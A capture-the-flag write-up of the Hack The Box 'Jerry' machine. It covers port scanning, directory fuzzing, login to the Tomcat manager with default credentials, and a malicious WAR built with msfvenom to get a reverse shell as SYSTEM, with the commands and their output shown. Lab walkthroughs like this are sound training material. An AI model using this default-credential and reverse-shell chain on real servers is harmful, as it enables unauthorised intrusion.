<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo -A -p- -T4 -v

```
# Nmap 7.93 scan initiated Mon Feb 13 16:19:03 2023 as: nmap -A -v -T4 -p- -oN jerry 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.18s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.004 days (since Mon Feb 13 16:17:00 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   192.77 ms 10.10.14.1
2   195.75 ms 10.10.10.95

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 13 16:23:25 2023 -- 1 IP address (1 host up) scanned in 261.65 seconds
```
We have only one port opened, this port runs http. So our enumeration today will be focused on port 8080.




<h2>Enumeration</h2>

Going to the webpage should give you this

![image](https://user-images.githubusercontent.com/67879936/222948686-e2712196-16e6-4250-b11c-c144c327653d.png)

Lets go aehad and fire up our directory searching tool

>command: ffuf -u "http://10.10.10.95:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/jerry]
└─$ ffuf -u "http://10.10.10.95:8080/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.95:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 307ms]
aux                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 212ms]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 243ms]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 214ms]
favicon.ico             [Status: 200, Size: 21630, Words: 19, Lines: 22, Duration: 217ms]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 233ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 254ms]
:: Progress: [32298/32298] :: Job [1/1] :: 145 req/sec :: Duration: [0:03:22] :: Errors: 0 ::
```
We have lots of directories here, but our main focus will be the  ```/manager``` directory. Lets navigate to that directory

![image](https://user-images.githubusercontent.com/67879936/222948604-1a15f2ef-dceb-420a-846e-d5551d311ef8.png)

We have to provide a username and a password here, after a little research I actually found the right one

```username:admin```        ```password:admin```

![image](https://user-images.githubusercontent.com/67879936/222948812-759fb7a9-69c7-4757-a27d-4d6b3f0c915f.png)

cool, we are logged in. Also, we can see we are provided with a username and password. We will use these creds to login to the ```/manager``` directory instead of using ```admin:admin```

```username:tomcat```     ```password:s3cret```

To log in again I'll advice you either our browser's history or you use another browser

![image](https://user-images.githubusercontent.com/67879936/222948885-30f62486-ab6b-4cea-ab47-e8734a5a66b5.png)

cool, we are logged in as user _tomcat_, scrolling down the webpage, you'll find this

![image](https://user-images.githubusercontent.com/67879936/222948920-3d220d58-19dd-448f-8192-03a963102661.png)

we are allowed to upload a ```.war``` file, we are going to exploit this feature.




<h2>Exploitation</h2>

We'll be creating a malicious ```.war``` file using msfvenom

>command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.49.53 LPORT=4444 -f war > runme.war

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f war > runme.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes

                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/jerry]
└─$ ls
jerry  runme.war
```
Now, lets go ahead and upload the malicious .war file

![image](https://user-images.githubusercontent.com/67879936/222949165-7066a957-1d4b-4382-a44c-bce2d62e57d3.png)

After uploading, ensure you set your netcat listner before clicking on the uploaded malicious .war file

>command: rlwrap nc -nvlp 4444

![image](https://user-images.githubusercontent.com/67879936/222949253-0bcfdfad-1231-4f40-a6dd-20fa8042d5e3.png)

Boom!!! We got a shell as user ```nt authority\system```

That will be all for today
<br> <br>
[Back To Home](../../index.md)

 





























